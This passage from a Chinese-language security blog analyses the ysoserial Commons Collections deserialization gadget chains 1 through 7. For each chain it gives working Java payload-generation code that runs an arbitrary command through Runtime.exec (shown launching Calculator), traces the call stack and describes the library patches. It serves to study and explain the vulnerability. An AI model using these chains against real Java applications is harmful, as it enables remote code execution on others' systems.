Collections被广泛应用于各种Java应用的开发。\n\nCommonsCollections造成RCE的根本原因就在于我们**构造了一个特殊的ChainedTransformer类的对象，这样当我们调用这个对象的transform函数的时候，就会造成命令执行**，于是，我们需要做的事情就是去寻找某个类，把包含恶意代码的transformerChain放到这个类里面，当对这个类的对象进行反序列化的时候会调用transformerChain的transform函数\n\n下面的payload构造都是参考自[ysoserial](https://github.com/frohoff/ysoserial)。这个工具用来生成各种反序列攻击向量，本文介绍的是常用的CommonmonsCollections库的构造方法，除此之外，还有很多反序列化的构造方法，大家可以去看源码好好研究下。\n\n#CommonsCollections1\n\n**适用版本**：3.1-3.2.1，jdk1.8以前\n\n这边先上CommonsCollections1的代码，为了便于阅读，这些代码都是我从ysoserial里面抽离并简化了的，关键的部分已经给上了注释，\n\n```java\nimport java.io.*;\nimport java.lang.reflect.*;\nimport java.util.HashMap;\nimport java.util.Map;\nimport com.nqzero.permit.Permit;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\nimport static sun.reflect.misc.FieldUtil.getField;\npublic class CommonsCollectionPayload {\n    static String ANN_INV_HANDLER_CLASS = \"sun.reflect.annotation.AnnotationInvocationHandler\";\n    //getInvocationHandler用于获取名为handler的InvocationHandler实例，并将map传入成员变量memberValues\n    public static InvocationHandler getInvocationHandler(String handler, Map<String, Object> map) throws Exception {\n        //获取构造函数\n        final Constructor<?> ctor = Class.forName(handler).getDeclaredConstructors()[0];\n        //获取handler的私有成员的访问权限，否则会报 can not access a member of class sun.reflect.annotation.AnnotationInvocationHandler\n        Permit.setAccessible(ctor);\n        //实例化\n        return (InvocationHandler) ctor.newInstance(Override.class, map);\n    }\n    //createMyproxy用于返回handler为ih，代理接口为iface的动态代理对象\n    public static <T> T createMyproxy(InvocationHandler ih, Class<T> iface) {\n        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, 1);\n        allIfaces[0] = iface;\n        return iface.cast(Proxy.newProxyInstance(CommonsCollectionPayload.class.getClassLoader(), allIfaces, ih));\n    }\n    //setFieldValue用于设置obj对象的成员变量fieldName的值为value\n    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {\n        Field field = null;\n        try {\n            //获取私有成员变量\n            field = obj.getClass().getDeclaredField(fieldName);\n            //获取私有成员变量访问权限\n            Permit.setAccessible(field);\n        }\n        catch (NoSuchFieldException ex) {\n            if (obj.getClass().getSuperclass() != null)\n                field = getField(obj.getClass().getSuperclass(), fieldName);\n        }\n        field.set(obj, value);\n    }\n    public static void main(String[] args) throws Exception {\n        String[] execArgs = new String[]{\"open /Applications/Calculator.app/\"};\n        // inert chain for setup\n        Transformer transformerChain = new ChainedTransformer(\n                new Transformer[]{new ConstantTransformer(1)});\n        // real chain for after setup\n        Transformer[] transformers = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\", new Class[]{\n                        String.class, Class[].class}, new Object[]{\n                        \"getRuntime\", new Class[0]}),\n                new InvokerTransformer(\"invoke\", new Class[]{\n                        Object.class, Object[].class}, new Object[]{\n                        null, new Object[0]}),\n                new InvokerTransformer(\"exec\",\n                        new Class[]{String.class}, execArgs),\n                new ConstantTransformer(1)};\n        //下面这部分为RCE的关键部分代码\n        Map innerMap = new HashMap();\n        //生成一个lazyMap对象，并将transformerChain赋值给对象的factory成员变量\n        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);\n        //创建一个Map接口的代理，并且为这个代理设置一个memberValues为lazyMap的AnnotationInvocationHandler\n        Map mapProxy = (Map) createMyproxy(getInvocationHandler(ANN_INV_HANDLER_CLASS, lazyMap), Map.class);\n        //创建一个memberValues为mapProxy的AnnotationInvocationHandler对象，这个对象也就是我们反序列化利用的恶意对象\n        InvocationHandler handler = getInvocationHandler(ANN_INV_HANDLER_CLASS, mapProxy);\n        //通过反射的方式进行赋值，即使赋值在生成对象之后也没有关系\n        setFieldValue(transformerChain, \"iTransformers\", transformers);\n        //将恶意对象存储为字节码\n        FileOutputStream fos = new FileOutputStream(\"payload.ser\");\n        ObjectOutputStream oos = new ObjectOutputStream(fos);\n        oos.writeObject(handler);\n        oos.flush();\n        oos.close();\n        //读取恶意对象字节码并进行反序列化操作\n        FileInputStream fis = new FileInputStream(\"payload.ser\");\n        ObjectInputStream ois = new ObjectInputStream(fis);\n        Object evilObject = ois.readObject();\n        ois.close();\n    }\n}\n```\n\n看一下关键部分的调用栈，\n\n![img1.png](/images/a7/1.png)\n\n当对恶意对象AnnotationInvocationHandler进行反序列化的时候，调用readObject方法，并对成员变量memberValues调用entrySet方法，\n\n![img2.png](/images/a7/2.png)\n\n由于memberValues是一个代理对象，所以回去调用该对象对应handler的invoke方法，一定要注意，这个时候的handler就是memberValues为lazyMap的handler了\n\n![img3.png](/images/a7/3.png)\n\n由于entrySet匹配不到if语句中的判断，走到else，，从而调用this.memberValues.get(var4)，于是到达了lazyMap.get()了\n\n![img4.png](/images/a7/4.png)\n\n我们代码注释里已经说过了，lazyMap的factory变量就是我们的恶意对象transformerChain，并且调用了他的transform方法，成功造成命令执行。\n\n我们去看一下3.2.2版本的时候这个漏洞是如何修复的\n\n```\n    private void writeObject(ObjectOutputStream os) throws IOException {\n        FunctorUtils.checkUnsafeSerialization(class$org$apache$commons$collections$functors$InvokerTransformer == null ? (class$org$apache$commons$collections$functors$InvokerTransformer = class$(\"org.apache.commons.collections.functors.InvokerTransformer\")) : class$org$apache$commons$collections$functors$InvokerTransformer);\n        os.defaultWriteObject();\n    }\n    private void readObject(ObjectInputStream is) throws ClassNotFoundException, IOException {\n        FunctorUtils.checkUnsafeSerialization(class$org$apache$commons$collections$functors$InvokerTransformer == null ? (class$org$apache$commons$collections$functors$InvokerTransformer = class$(\"org.apache.commons.collections.functors.InvokerTransformer\")) : class$org$apache$commons$collections$functors$InvokerTransformer);\n        is.defaultReadObject();\n    }\n```\n\n就是在调用readObject和writeObject的时候把InvokerTransformer类给拉黑了。（当然这个还是需要看一下系统的配置org.apache.commons.collections.enableUnsafeSerialization的值的，不过这个值默认是false）\n\n# CommonsCollections2\n\n**适用版本**：commons-collections-4.0, jdk7u21及以前其实这个CommonsCollections2只能叫另一种利用方式，而不能叫做CommonsCollections1的绕过，因为CommonsCollections1也是可以在commons-collections-4.0利用成功的，但是因为commons-collections-4.0删除了lazyMap的decode方法，所以需要将代码中的\n\n```java\nMap lazyMap = LazyMap.decorate(innerMap, transformerChain);\n```\n\n修改为\n\n```java\nMap lazyMap = LazyMap.lazyMap(innerMap,transformerChain);\n```\n\n而且，更重要的一点，CommonsCollections2不能在3.1-3.2.1版本利用成功，**根本原因在于CommonsCollections2的payload中使用的TransformingComparator在3.1-3.2.1版本中还没有实现Serializable接口，无法被反序列化。**\n\n现在我们来看一下CommonsCollections2的payload\n\n```java\nimport com.nqzero.permit.Permit;\nimport com.sun.org.apache.xalan.internal.xsltc.DOM;\nimport com.sun.org.apache.xalan.internal.xsltc.TransletException;\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\nimport com.sun.org.apache.xml.internal.serializer.SerializationHandler;\nimport javassist.ClassClassPath;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport org.apache.commons.collections4.comparators.TransformingComparator;\nimport org.apache.commons.collections4.functors.InvokerTransformer;\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.util.PriorityQueue;\nimport static sun.reflect.misc.FieldUtil.getField;\npublic class CommonCollection2Payload {\n//    通过javassist动态创建类的时候需要用到这个类\n    public static class StubTransletPayload extends AbstractTranslet implements Serializable {\n        private static final long serialVersionUID = -5971610431559700674L;\n        public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}\n        @Override\n        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}\n    }\n// 设置成员变量值\n    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {\n        Field field = null;\n        try {\n            //获取私有成员变量\n            field = obj.getClass().getDeclaredField(fieldName);\n            //获取私有成员变量访问权限\n            Permit.setAccessible(field);\n        }\n        catch (NoSuchFieldException ex) {\n            if (obj.getClass().getSuperclass() != null)\n                field = getField(obj.getClass().getSuperclass(), fieldName);\n        }\n        field.set(obj, value);\n    }\n//  获取成员变量值得\n    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {\n        Field field = null;\n        try {\n            field = obj.getClass().getDeclaredField(fieldName);\n            Permit.setAccessible(field);\n        }\n        catch (NoSuchFieldException ex) {\n            if (obj.getClass().getSuperclass() != null)\n                field = getField(obj.getClass().getSuperclass(), fieldName);\n        }\n        return field.get(obj);\n    }\n//  7u21反序列化漏洞恶意类生成函数\n    public static Object createTemplatesImpl(String command) throws Exception{\n        Object templates = Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\").newInstance();\n        // use template gadget class\n        ClassPool pool = ClassPool.getDefault();\n        final CtClass clazz = pool.get(StubTransletPayload.class.getName());\n        String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"\" +\n                command.replaceAll(\"\\\\\\\\\",\"\\\\\\\\\\\\\\\\\").replaceAll(\"\\\"\", \"\\\\\\\"\") +\n                \"\\\");\";\n        clazz.makeClassInitializer().insertAfter(cmd);\n        clazz.setName(\"ysoserial.Pwner\" + System.nanoTime());\n        final byte[] classBytes = clazz.toBytecode();\n        setFieldValue(templates, \"_bytecodes\", new byte[][] {\n                classBytes});\n        // required to make TemplatesImpl happy\n        setFieldValue(templates, \"_name\", \"Pwnr\");\n        setFieldValue(templates, \"_tfactory\", Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl\").newInstance());\n        return templates;\n    }\n    public static void main(String[] args) throws Exception {\n        String command = \"open /Applications/Calculator.app/\";\n        final Object templates = createTemplatesImpl(command);\n        // payload中再次使用了InvokerTransformer，可见这个在3.2.2版本中被拉黑的类在4.0中反倒又可以用了\n        //这个toString值只是个幌子，后面会通过setFieldValue把iMethodName的值改成newTransformer\n        final InvokerTransformer transformer = new InvokerTransformer(\"toString\", new Class[0], new Object[0]);\n        // payload中的核心代码模块，创建一个PriorityQueue对象，并将它的comparator设为包含恶意transformer对象的TransformingComparator\n        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(transformer));\n        // 先设置为正常变量值，在后面通过setFieldValue来修改\n        queue.add(1);\n        queue.add(1);\n        // 不再像第一个payload中一样直接去调用调出runtime的exec，而是通过调用TemplatesImpl类的newTransformer方法来实现RCE\n        setFieldValue(transformer, \"iMethodName\", \"newTransformer\");\n        final Object[] queueArray = (Object[]) getFieldValue(queue, \"queue\");\n        queueArray[0] = templates;\n        queueArray[1] = 1;\n        FileOutputStream fos = new FileOutputStream(\"payload.ser\");\n        ObjectOutputStream oos = new ObjectOutputStream(fos);\n        oos.writeObject(queue);\n        oos.flush();\n        oos.close();\n        FileInputStream fis = new FileInputStream(\"payload.ser\");\n        ObjectInputStream ois = new ObjectInputStream(fis);\n        Object newObj = ois.readObject();\n        ois.close();\n    }\n}\n```\n\n这个payload和1在造成RCE的原理上有个不同是不再去依靠Runtime类的exec，而是使用了我们知名的7u21模块，关于7u21模块RCE的讲解，我们也不细谈，网上大把大把的分析，只需要明白一件事情，我们只要能调用包含恶意字节码的TemplatesImpl对象的利用链中的任意函数(getOutputProperties、newTransformer等等)，就能造成RCE。\n\n先去看调用链，\n\n![img5.jpg](/images/a7/5.png)\n\n反序列化时候调用PriorityQueue的readObject方法，并在函数最后调用heapify方法，\n\n![img6.jpg](/images/a7/6.png)\n\nheapify方法会把PriorityQueue的queue变量作为参数去调用siftDown方法\n\n![img7.jpg](/images/a7/7.png)\n\n只要有comparetor就会去调用siftDownUsingComparator方法\n\n![img8.jpg](/images/a7/8.png)\n\n调用comparator的compare方法，这个comparator就是我们传入的tranformer为恶意InvokerTransformer对象的TransformingComparator\n\n![img9.jpg](/images/a7/9.png)\n\n成功调用到恶意tranformer的tranform方法，并把恶意TemplatesImpl作为参数传入，剩下的不在去跟。\n\n![img10.jpg](/images/a7/10.png)\n\n关于4.0的补丁，和3.2.2的时候一模一样，就是把InvokerTransformer给拉黑了。\n\n# CommonsCollections3\n\n**适用版本**：3.1-3.2.1，jdk7u21及以前\n\nCommonsCollections3出现了一个我们在CommonsCollections1中没怎么见到过的InstantiateTransformer，先去看一下这个InstantiateTransformer的transform方法，\n\n```java\n    public Object transform(Object input) {\n        try {\n            if (!(input instanceof Class)) {\n                throw new FunctorException(\"InstantiateTransformer: Input object was not an instanceof Class, it was a \" + (input == null ? \"null object\" : input.getClass().getName()));\n            } else {\n                Constructor con = ((Class)input).getConstructor(this.iParamTypes);\n                return con.newInstance(this.iArgs);\n            }\n        }\n```\n\n简单来说这个transform方法的用处就是**调用input参数的构造函数，并且这个类的两个成员变量就是传给构造函数的参数类型和参数值**。其他的地方就和CommonsCollections1差不多了。\n\n看一下代码，考虑到代码中用到的一些关键函数在前面两个payload里面已经给出了，所以接下来的代码里面我就只给出main函数代码了。\n\n```java\n    public static void main(String[] args) throws Exception {\n        String command = \"open /Applications/Calculator.app/\";\n        Object templatesImpl = createTemplatesImpl(command);\n        final Transformer transformerChain = new ChainedTransformer(\n                new Transformer[]{ new ConstantTransformer(1) });\n        final Transformer[] transformers = new Transformer[] {\n                new ConstantTransformer(TrAXFilter.class),\n                new InstantiateTransformer(\n                        new Class[] { Templates.class },\n                        new Object[] { templatesImpl } )};\n        final Map innerMap = new HashMap();\n        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);\n        Map mapProxy = (Map) createMyproxy(getInvocationHandler(ANN_INV_HANDLER_CLASS, lazyMap), Map.class);\n        InvocationHandler handler = getInvocationHandler(ANN_INV_HANDLER_CLASS, mapProxy);\n        //这样的话，调用transformerChain的tranform方法就相当于调用TrAXFilter(templatesImpl)\n        setFieldValue(transformerChain, \"iTransformers\", transformers);\n        FileOutputStream fos = new FileOutputStream(\"payload.ser\");\n        ObjectOutputStream oos = new ObjectOutputStream(fos);\n        oos.writeObject(handler);\n        oos.flush();\n        oos.close();\n        FileInputStream fis = new FileInputStream(\"payload.ser\");\n        ObjectInputStream ois = new ObjectInputStream(fis);\n        Object newObj = ois.readObject();\n        ois.close();\n    }\n```\n\n看一下调用栈，\n\n![img11.jpg](/images/a7/11.png)\n\n基本所有地方都和CommonsCollections1差不多，唯一的区别就在于循环调用的transformers变成了这个样子\n\n```java\n final Transformer[] transformers = new Transformer[] {\n                new ConstantTransformer(TrAXFilter.class),\n                new InstantiateTransformer(\n                        new Class[] { Templates.class },\n                        new Object[] { templatesImpl } )};\n```\n\nConstantTransformer返回了TrAXFilter的对象给到InstantiateTransformer的tranform方法，最终调用TrAXFilter的构造函数，并把恶意的templatesImpl作为参数给到构造函数，\n\n![img12.jpg](/images/a7/12.png)\n\n看一下TrAXFilter的构造函数会去调用传入的恶意templatesImpl的newTransformer方法，正好符合我们的期望，造成RCE。\n\n看一下3.2.2版本的修复补丁，和CommonsCollections1一样，就是把InstantiateTransformer类给拉黑了。\n\n# CommonsCollections4\n\n**适用版本**：4.0，jdk7u21及以前\n\nCommonsCollections4这个payload认真的说，完全没有任何新的东西，其实就是把CommonsCollections2和CommonsCollections3做了一个杂交。不过从中我们可以窥探到，其实不论是4.0版本还是3.1-3.2.1版本，利用的方法基本都是可以共通的。\n\n看一下代码，\n\n```java\n    public static void main(String[] args) throws Exception {\n        String command = \"open /Applications/Calculator.app/\";\n        Object templates = createTemplatesImpl(command);\n        ConstantTransformer constant = new ConstantTransformer(String.class);\n        Class[] paramTypes = new Class[] { String.class };\n        Object[] str = new Object[] { \"foo\" };\n        InstantiateTransformer instantiate = new InstantiateTransformer(\n                paramTypes, str);\n        paramTypes = (Class[]) getFieldValue(instantiate, \"iParamTypes\");\n        str = (Object[]) getFieldValue(instantiate, \"iArgs\");\n        ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });\n        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chain));\n        queue.add(1);\n        queue.add(1);\n        setFieldValue(constant, \"iConstant\", TrAXFilter.class);\n        paramTypes[0] = Templates.class;\n        str[0] = templates;\n        FileOutputStream fos = new FileOutputStream(\"payload.ser\");\n        ObjectOutputStream oos = new ObjectOutputStream(fos);\n        oos.writeObject(queue);\n        oos.flush();\n        oos.close();\n        FileInputStream fis = new FileInputStream(\"payload.ser\");\n        ObjectInputStream ois = new ObjectInputStream(fis);\n        Object newObj = ois.readObject();\n        ois.close();\n    }\n```\n\n看一下调用栈，\n\n![img13.jpg](/images/a7/13.png)\n\n代码在上面都是分析过的，简要的文字分析一下：反序列化的时候调用PriorityQueue的readObject方法，从而调用了TransformingComparator中恶意的ChainedTransformer对象的tranform方法，通过循环调用ChainedTransformer中iTransformer对象的tranform方法，进而调用TrAXFilter的构造方法，从而造成命令执行。\n\n不过关于4.1版本的修复和3.2.2是存在不一样的地方的，3.2.2对于InstantiateTransformer类的处理是拉入黑名单，而4.1版本选择把InstantiateTransformer类的反序列化接口给删除了。\n\n![img14.jpg](/images/a7/14.png)\n\n# CommonsCollections5\n\n**适用版本**：3.1-3.2.1，jdk1.8（1.9没试）\n\nCommonsCollections5和前面几个payload有些不太一样的地方，因为jdk在1.8之后对AnnotationInvocationHandler类做了限制，所以在jdk1.8版本就必须找出能替代AnnotationInvocationHandler的新的可以利用的类，所以BadAttributeValueExpException就被发掘了除了，我们直接根据代码来了解这个类，\n\n```java\npublic static void main(String[] args) throws Exception {\n        String command = \"open /Applications/Calculator.app/\";\n        final String[] execArgs = new String[] { command };\n        final Transformer transformerChain = new ChainedTransformer(\n                new Transformer[]{ new ConstantTransformer(1) });\n        final Transformer[] transformers = new Transformer[] {\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\", new Class[] {\n                        String.class, Class[].class }, new Object[] {\n                        \"getRuntime\", new Class[0] }),\n                new InvokerTransformer(\"invoke\", new Class[] {\n                        Object.class, Object[].class }, new Object[] {\n                        null, new Object[0] }),\n                new InvokerTransformer(\"exec\",\n                        new Class[] { String.class }, execArgs),\n                new ConstantTransformer(1) };\n        final Map innerMap = new HashMap();\n        //创建factory为恶意ChainedTransformer对象的lazyMap类实例\n        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);\n        //创建map为恶意lazyMap，key为foo的TiedMapEntry类实例\n        TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\");\n        //将BadAttributeValueExpException对象的成员变量val赋值为恶意entry\n        BadAttributeValueExpException val = new BadAttributeValueExpException(null);\n        Field valfield = val.getClass().getDeclaredField(\"val\");\n        Permit.setAccessible(valfield);\n        valfield.set(val, entry);\n        setFieldValue(transformerChain, \"iTransformers\", transformers);\n        FileOutputStream fos = new FileOutputStream(\"payload.ser\");\n        ObjectOutputStream oos = new ObjectOutputStream(fos);\n        oos.writeObject(val);\n        oos.flush();\n        oos.close();\n        FileInputStream fis = new FileInputStream(\"payload.ser\");\n        ObjectInputStream ois = new ObjectInputStream(fis);\n        Object newObj = ois.readObject();\n        ois.close();\n    }\n```\n\n这个利用链很简单，\n\n![img15.jpg](/images/a7/15.png)\n\n在BadAttributeValueExpException的readObject中，会调用它的成员变量val（也就是我们传入的恶意TiedMapEntry对象）的toString方法，\n\n![img16.jpg](/images/a7/16.png)\n\n在TiedMapEntry中会调用自身的getKey和getValue方法，\n\n![img17.jpg](/images/a7/17.png)\n\n在getValue方法中会调用成员变量map（也就是我们传入的恶意LazyMap对象）的get方法，\n\n![img18.jpg](/images/a7/18.png)\n\n接下来就和CommonsCollections1是一样的了，不再分析。\n\nCommonsCollections在3.2.2版本的时候同样将BadAttributeValueExpException拉入了黑名单。\n\n# CommonsCollections6\n\n**适用版本**：3.1-3.2.1，jdk1.7,1.8均可成功\n\nCommonsCollections6是一个实用性比较广的payload，和上面五个payload相比，它的利用受jdk版本的影响是最小的，先看代码，\n\n```java\n public static void main(String[] args) throws Exception {\n        String command = \"open /Applications/Calculator.app/\";\n        final String[] execArgs = new String[] { command };\n        final Transformer[] transformers = new Transformer[] {\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\", new Class[] {\n                        String.class, Class[].class }, new Object[] {\n                        \"getRuntime\", new Class[0] }),\n                new InvokerTransformer(\"invoke\", new Class[] {\n                        Object.class, Object[].class }, new Object[] {\n                        null, new Object[0] }),\n                new InvokerTransformer(\"exec\",\n                        new Class[] { String.class }, execArgs),\n                new ConstantTransformer(1) };\n        Transformer transformerChain = new ChainedTransformer(transformers);\n        final Map innerMap = new HashMap();\n//创建一个factory为恶意ChainedTransformer对象的lazyMap类实例\n        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);\n//创建一个map为恶意lazyMap类实例，key为foo的TiedMapEntry类实例\n        TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\");\n        HashSet map = new HashSet(1);\n        map.add(\"foo\");\n        Field f = null;\n        try {\n            f = HashSet.class.getDeclaredField(\"map\");\n        } catch (NoSuchFieldException e) {\n            f = HashSet.class.getDeclaredField(\"backingMap\");\n        }\n//取出HashSet对象的成员变量map\n        Permit.setAccessible(f);\n        HashMap innimpl = (HashMap) f.get(map);\n        Field f2 = null;\n        try {\n            f2 = HashMap.class.getDeclaredField(\"table\");\n        } catch (NoSuchFieldException e) {\n            f2 = HashMap.class.getDeclaredField(\"elementData\");\n        }\n//取出HashMap对象的成员变量table\n        Permit.setAccessible(f2);\n        Object[] array = (Object[]) f2.get(innimpl);\n//取出table里面的第一个Entry\n        Object node = array[0];\n        if(node == null){\n            node = array[1];\n        }\n        Field keyField = null;\n        try{\n            keyField = node.getClass().getDeclaredField(\"key\");\n        }catch(Exception e){\n            keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(\"key\");\n        }\n//取出Entry对象重的key，并将它赋值为恶意的TiedMapEntry对象\n        Permit.setAccessible(keyField);\n        keyField.set(node, entry);\n        FileOutputStream fos = new FileOutputStream(\"payload.ser\");\n        ObjectOutputStream oos = new ObjectOutputStream(fos);\n        oos.writeObject(map);\n        oos.flush();\n        oos.close();\n        FileInputStream fis = new FileInputStream(\"payload.ser\");\n        ObjectInputStream ois = new ObjectInputStream(fis);\n        Object newObj = ois.readObject();\n        ois.close();\n    }\n```\n\nCommonsCollections6的代码是最可以体现出使用反射机制生成恶意对象的优势的代码，我们看一下上面payload中使用反射机制的代码\n\n```java\n HashSet map = new HashSet(1);\n        map.add(\"foo\");\n        Field f = null;\n        try {\n            f = HashSet.class.getDeclaredField(\"map\");\n        } catch (NoSuchFieldException e) {\n            f = HashSet.class.getDeclaredField(\"backingMap\");\n        }\n//取出HashSet对象的成员变量map\n        Permit.setAccessible(f);\n        HashMap innimpl = (HashMap) f.get(map);\n        Field f2 = null;\n        try {\n            f2 = HashMap.class.getDeclaredField(\"table\");\n        } catch (NoSuchFieldException e) {\n            f2 = HashMap.class.getDeclaredField(\"elementData\");\n        }\n//取出HashMap对象的成员变量table\n        Permit.setAccessible(f2);\n        Object[] array = (Object[]) f2.get(innimpl);\n//取出table里面的第一个Entry\n        Object node = array[0];\n        if(node == null){\n            node = array[1];\n        }\n        Field keyField = null;\n        try{\n            keyField = node.getClass().getDeclaredField(\"key\");\n        }catch(Exception e){\n            keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(\"key\");\n        }\n//取出Entry对象重的key，并将它赋值为恶意的TiedMapEntry对象\n        Permit.setAccessible(keyField);\n        keyField.set(node, entry);\n```\n\n上面给出的这么一长串代码，其实如果不使用反射机制去生成恶意对象，只需要两行代码\n\n```java\n        HashSet map = new HashSet(1);\n        map.add(entry);\n```\n\n两个代码生成的map对象是一摸一样的对象，但是使用第二种方式，你会发现在反序列化的时候无法造成RCE（第二种同样会造成RCE但是是发生在map.add的时候而不是ois.readObject()的时候），原因就出在了lazyMap类的get函数处，\n\n![img19.jpg](/images/a7/19.png)\n\n触发RCE的关键就在于this.factory.transform(key)，然而想走到这一步，需要一个条件：!this.map.containsKey(key)，翻译一下就是加载的这个key之前未被get函数调用过，并且一旦调用过一次后，就会直接把这个key-value对放进this.map中，下次调用直接走else语句，而不会再去调用this.factory.transform(key)。\n\n这样的话，当我们通过map.add(entry)的方式去生成恶意HashSet对象的时候，看一下add方法的调用栈\n\n![img20.jpg](/images/a7/20.png)\n\nadd方法本身就会调用LazyMap的get方法，这样的话，我们需要造成RCE的map在还没进行反序列化的时候，就已经被put到this.map中去了，到了反序列化企图造成rce的时候，调用 LazyMap的get方法，不会再去走if语句而走到else里面去了，从而无法造成命令执行。\n\n当然这种情况并不是无解的，我们可以将上述两行代码中做一下修改变成这种形式，\n\n```java\n        HashSet map = new HashSet(1);\n        map.add(entry);\n        lazyMap.remove(\"foo\");\n```\n\n就是记得把lazyMap中的this.map记得删除一下就完事了，也很简单~~~\n\n现在我们去看一下使用反射机制生成恶意对象从而在反序列化后造成RCE的调用链，\n\n![img21.jpg](/images/a7/21.png)\n\n调用HashSet的readObject方法进行反序列化，将恶意的TiedMapEntry对象带入put函数，\n\n![img22.jpg](/images/a7/22.png)\n\n在put函数中会把恶意的TiedMapEntry对象放入hash函数中，\n\n![img23.jpg](/images/a7/23.png)\n\n在hash函数中调用了恶意的TiedMapEntry对象的hashCode函数\n\n![img24.jpg](/images/a7/24.png)\n\n在hashCode函数中会调用恶意的TiedMapEntry对象自身的getValue函数\n\n![img25.jpg](/images/a7/25.png)\n\n在getValue函数中调用this.map的get函数\n\n![img26.jpg](/images/a7/26.png)\n\n在get函数中调用恶意TiedMapEntry的恶意factory对象的tranform方法，从而造成rce，这里面可以看到这个时候this.map是空的，所以我们能成功进入到if语句中。\n\n![img27.jpg](/images/a7/27.png)\n\n因为这个payload也是用到了InvokerTransformer类的，所以修复方案和第一个payload是一样的。\n\n# CommonsCollections7\n\n**适用版本**：3.1-3.2.1，jdk1.7,1.8均可成功\n\nCommonsCollections7也是一个适用性比较好的payload，在多种版本jdk中都可以执行成功，它的坑点和CommonsCollections6都有着一定的相似性。可以窥探到当把lazyMap作为key传入到hashset或者hashtable的时候往往都会对lazyMap本身的map参数造成一定影响，而这种影响很容易导致rce的失败。\n\n看一下代码，关键的两步我都在代码里面加上了注释，\n\n```java\n    public static void main(String[] args) throws Exception {\n        String command = \"open /Applications/Calculator.app/\";\n        final String[] execArgs = new String[]{command};\n        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});\n        final Transformer[] transformers = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\",\n                        new Class[]{String.class, Class[].class},\n                        new Object[]{\"getRuntime\", new Class[0]}),\n                new InvokerTransformer(\"invoke\",\n                        new Class[]{Object.class, Object[].class},\n                        new Object[]{null, new Object[0]}),\n                new InvokerTransformer(\"exec\",\n                        new Class[]{String.class},\n                        execArgs),\n                new ConstantTransformer(1)};\n        Map innerMap1 = new HashMap();\n        Map innerMap2 = new HashMap();\n        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);\n        lazyMap1.put(\"yy\", 1);\n        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);\n        lazyMap2.put(\"zZ\", 1);\n        Hashtable hashtable = new Hashtable();\n        hashtable.put(lazyMap1, 1);\n        //开启调试模式去跟一下hashtable.put(lazyMap2, 2)这个代码执行后的变量变化，会发现会发现lazyMap2的map内多了一个 yy->yy的map\n        hashtable.put(lazyMap2, 2);\n        setFieldValue(transformerChain, \"iTransformers\", transformers);\n        //这一步正是为了删除在hashtable.put(lazyMap2, 2)后lazyMap2中多出的那个yy->yy的map\n        lazyMap2.remove(\"yy\");\n        FileOutputStream fos = new FileOutputStream(\"payload.ser\");\n        ObjectOutputStream oos = new ObjectOutputStream(fos);\n        oos.writeObject(hashtable);\n        oos.flush();\n        oos.close();\n        FileInputStream fis = new FileInputStream(\"payload.ser\");\n        ObjectInputStream ois = new ObjectInputStream(fis);\n        Object newObj = ois.readObject();\n        ois.close();\n    }\n```\n\n这个代码的坑就在于当调用hashtable.put(lazyMap2, 2)的时候会因为put函数的一系列操作把lazyMap2变成了我们不期望的模样，\n\n![img28.jpg](/images/a7/28.png)\n\n可以看到lazyMap中的map多了一个yy->yy，其实一旦出现这种情况我们就知道肯定和lazyMap的get函数有关，打个断点看一下什么情况，\n\n![img29.jpg](/images/a7/29.png)遇到这种情况处理起来也很简单，lazyMap2.remove(“yy”)就完事了。\n\nOK，明白了payload的生成代码，接下来我们就去看一下反序列化时候的利用链，\n\n![img30.jpg](/images/a7/30.png)\n\n在Hashtable的readObject方法中会把每个key-value往table里面丢，\n\n![img31.jpg](/images/a7/31.png)\n\n从往table中丢第二个map的时候，就需要开始让它的key和之前的key进行对比，看看有没有重复以决定是新添加一个map还是覆盖原有的，\n\n![img32.jpg](/images/a7/32.png)\n\n然后经过两个equals函数后自然而然的要去调用对于map的get函数以获取值，以做修改，于是就又来到了我们熟悉额lazyMap的get函数，从而调用tranform方法导致了RCE,\n\n![img33.jpg](/images/a7/33.png)\n\n# 总结\n\n通过对ysoserial中关于CommonsCollection的七个利用方式的分析我们可以对可以利用的恶意类做一个总结：\n\n## 四大Tranformer的tranform方法的作用\n\n> **1.ChainedTransformer：**循环调用成员变量iTransformers数组的中ransformer中的tranform方法。\n>\n> **2.InvokerTransformer：** 